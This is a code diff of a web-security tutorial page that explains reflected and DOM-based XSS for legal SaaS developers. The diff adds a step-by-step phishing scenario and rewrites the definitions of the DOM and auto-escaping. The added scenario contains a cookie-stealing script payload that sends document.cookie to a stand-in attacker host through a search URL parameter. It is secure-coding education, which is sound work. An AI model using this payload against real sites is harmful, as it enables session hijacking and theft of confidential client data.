@@ -98,11 +98,20 @@
 
     <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Malicious script is reflected off the server in the immediate response — typically via a URL parameter or form submission that the server echoes back.</p>
 
-    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A search endpoint that reflects the search query in the results page: "You searched for: <code>&lt;script&gt;...&lt;/script&gt;</code>". The attacker crafts a URL and sends it to the target (phishing email to a partner with a link to "review this urgent case").</p>
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A search endpoint that reflects the search query in the results page: &ldquo;You searched for: <code>&lt;script&gt;...&lt;/script&gt;</code>&rdquo;. Here is how the phishing attack works step by step:</p>
+
+    <ol style="margin-bottom:1.5rem;margin-left:1.5rem;" class="list-decimal space-y-3 text-base leading-relaxed text-ink-light">
+        <li>Your legal SaaS has a case search page at <code>app.lawfirm.com/search?q=...</code>. Whatever the user types in the search box is echoed back on the results page as &ldquo;You searched for: [query]&rdquo; &mdash; but the server does not encode the output.</li>
+        <li>The attacker crafts a URL that puts a malicious script in the search parameter: <code>app.lawfirm.com/search?q=&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;</code></li>
+        <li>The attacker sends this link to a senior partner in a convincing phishing email: &ldquo;Urgent &mdash; please review this case reference immediately.&rdquo; The link looks legitimate because it points to your real domain.</li>
+        <li>The partner clicks the link. The server builds the results page and embeds the attacker&rsquo;s script directly into the HTML. The browser sees it as part of the page and executes it.</li>
+        <li>The script silently sends the partner&rsquo;s session cookie to the attacker&rsquo;s server. The partner sees a normal &ldquo;no results found&rdquo; page and suspects nothing.</li>
+        <li>The attacker now has the partner&rsquo;s authenticated session and can access every matter, document, and client communication the partner can see.</li>
+    </ol>
 
     <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">DOM-Based XSS</h3>
 
-    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">The vulnerability exists entirely in client-side JavaScript. The server never sees the payload — it's processed by JavaScript reading from <code>location.hash</code>, <code>document.referrer</code>, or other client-side data sources and injecting it into the DOM unsafely.</p>
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">The vulnerability exists entirely in client-side JavaScript. The server never sees the payload &mdash; it&rsquo;s processed by JavaScript reading from <code>location.hash</code>, <code>document.referrer</code>, or other client-side data sources and injecting it into the DOM (the Document Object Model &mdash; the browser&rsquo;s internal representation of the page, as we introduced in Episode 7) unsafely.</p>
 
     <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light"><strong class="text-ink">Legal SaaS vector:</strong> A document preview component that reads a filename from the URL hash and inserts it into the page using <code>innerHTML</code>. The attacker crafts a URL with a script payload in the hash fragment.</p>
 
@@ -218,7 +227,7 @@
 
     <h2 style="margin-top:2.5rem;margin-bottom:1rem;" class="text-2xl font-bold">Auto-Escaping and Its Gaps</h2>
 
-    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Modern template engines (React, Vue, Angular, Jinja2, Handlebars) auto-escape by default. React's JSX treats all expressions as text unless you explicitly use <code>dangerouslySetInnerHTML</code>. <a href="https://reactjs.org/docs/introducing-jsx.html#jsx-prevents-injection-attacks" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">This eliminates the majority of XSS vulnerabilities</a>.</p>
+    <p style="margin-bottom:1rem;" class="text-base leading-relaxed text-ink-light">Modern template engines (React, Vue, Angular, Jinja2, Handlebars) auto-escape by default &mdash; meaning they automatically convert special characters like <code>&lt;</code> and <code>&gt;</code> into their safe HTML equivalents (<code>&amp;lt;</code> and <code>&amp;gt;</code>) so the browser displays them as text rather than interpreting them as code. React's JSX treats all expressions as text unless you explicitly use <code>dangerouslySetInnerHTML</code>. <a href="https://reactjs.org/docs/introducing-jsx.html#jsx-prevents-injection-attacks" target="_blank" rel="noopener" class="text-red hover:text-red-soft border-b border-red/40 hover:border-red transition">This eliminates the majority of XSS vulnerabilities</a>.</p>
 
     <h3 style="margin-top:1.5rem;margin-bottom:0.75rem;" class="text-xl font-bold">Where Auto-Escaping Fails</h3>
 
